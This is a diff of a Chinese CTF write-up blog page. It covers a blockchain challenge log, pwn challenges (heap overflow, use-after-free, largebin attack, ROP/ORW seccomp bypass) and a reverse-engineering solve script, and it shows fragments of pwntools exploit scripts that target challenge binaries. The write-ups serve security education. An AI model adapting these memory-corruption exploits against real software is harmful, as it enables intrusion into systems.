class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">9</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x5a55b2d970d079d39ce4c5dc9ec6de52ebfc2bbcfc7466d62eea534ee8736673&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x23ddb4dbb8577d03ebf1139a17a5c016963c43761e8ccd21eaa68e9b8ce6a68e&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">11</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">})]</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>进入<code>Option 3</code>，获取<code>flag</code>。</p>
+</span></span></code></pre></div><p>进入<code>Option 3</code>，获取<code>flag</code>。</p>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/39.png" alt="39"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{dbf227cc-3cbe-4237-b68b-2269e00a3ed0}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="pwn">pwn</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{dbf227cc-3cbe-4237-b68b-2269e00a3ed0}
+</span></span></code></pre></div><h1 id="pwn">pwn</h1>
 <h2 id="webheap_revenge">webheap_revenge</h2>
 <p>和webheap差不多，只是uaf改成了堆溢出，先改size造成重叠，然后申请出来就可以使用，泄露libc采用分割unsorted的方法就行了。
 exp如下</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#sh = process(&#39;./webheap_revenge&#39;)</span>
@@ -1754,56 +1058,14 @@ exp如下</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="bfbf">bfbf</h2>
+</span></span></code></pre></div><h2 id="bfbf">bfbf</h2>
 <p>该处函数存在数组索引溢出，然后这里存在栈里的地址泄露，以及栈里的数据篡改漏洞
 <img src="/img/2022-11-06-NTFY/39.png" alt="">
 而上图的++i &ndash;i等需要在另一个函数(如下)里来设置对应的值
 <img src="/img/2022-11-06-NTFY/40.png" alt=""></p>
 <p>而这里我们想让对应的内存单元为对应的选项，就要输入不同的符号来标记一下。</p>
 <p>先泄露栈里存放的libc地址和堆地址(用于存放后面打orw时的字符串flag)，然后直接让索引改到返回地址(libc_start_main)，直接从这里开始写rop链。根据沙箱规则来看的话，没有禁用execve，但不知道为啥我打execve没法获取shell。最后还是打的orw，不过read的话,文件描述符不能大于1，所以要先close关掉标准输入，然后再open，从而read write读出flag</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./attachment.bk.bk&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./attachment.bk.bk&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
@@ -1839,88 +1101,10 @@ exp如下</p>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stack_addr</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">exit_addr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/flag</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="webheap">webheap</h2>
+</span></span></code></pre></div><h2 id="webheap">webheap</h2>
 <p>2.27的堆，delete中有个uaf，直接通过uaf泄露libc地址，然后改fd为free_hook，并向free_hook写入system地址，然后free一个内容为/bin/sh\x00的堆块就可以了，数据开头的80，81，82，83，分别代表后面接1字节，2字节，4字节，8字节，选项要以86开头。
 exp如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./webheap&#39;</span><span class="p">)</span>
@@ -1992,152 +1176,14 @@ exp如下：</p>
 </span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="store">store</h2>
+</span></span></code></pre></div><h2 id="store">store</h2>
 <p>只允许add两次，每次两个堆块，且可以free四次，size需要小于0xfff。
 由于一个缓冲区大小是0x400，所以当scanf读入的数据大小大于等于0x400的时候，缓冲区不够存放，就会另外申请一个0x800的大堆块存放数据，然后再free掉。
 可以通过上述scanf的特性，通过申请大堆块，使得unsorted bin中的堆块进入largebin中。因此很容易完成largebin attack，然后伪造_IO_FILE，通过exit触发，这里采用了house of apple的调用链。
 32位部分的沙盒，seccomp-tools还是按64位的系统调用号显示的，转换如下：</p>
 <p><img src="/img/2022-11-06-NTFY/41.png" alt=""></p>
 <p>通过int 0x80可以切换到32位，也就可以用open了。这里先用mmap2开辟32位空间给rsp，因为后面是32位系统调用且涉及栈操作（mmap2不涉及栈操作，所以rsp是64位地址也行），故栈需要是32位地址，不然会出错。然后open当前目录，用getents读取到rsp，就是之前mmap2开辟的32位地址空间上。打出目录下的所有文件名后，找到flag文件名的偏移，最后用64位的read和write输出即可。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span><span class="lnt">132
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./pwn&#34;)</span>
@@ -2269,9 +1315,7 @@ exp如下：</p>
 </span></span><span class="line"><span class="cl">	
 </span></span><span class="line"><span class="cl">	<span class="n">quit</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="rev">Rev</h1>
+</span></span></code></pre></div><h1 id="rev">Rev</h1>
 <h2 id="comeongo">comeongo</h2>
 <p>check1
 取name和password的前4位拼接之后base58加密对比
@@ -2281,28 +1325,7 @@ check2
 解密将数据带入测试，发现加密后的实际结果为_BinorRe
 再将_BinorRe带入发现输入正确
 check2取最后四位相加比较以及相差验证，password最后的前两位储存在内存里面</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="p">[</span><span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">]</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="p">[</span><span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="s1">&#39;vG&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
@@ -2319,46 +1342,9 @@ check2取最后四位相加比较以及相差验证，password最后的前两位
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#GoM0bi13_BingGo@</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#G3tItEzForRevG0!</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="windows_call">windows_call</h2>
+</span></span></code></pre></div><h2 id="windows_call">windows_call</h2>
 <p>解出flag前八位</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
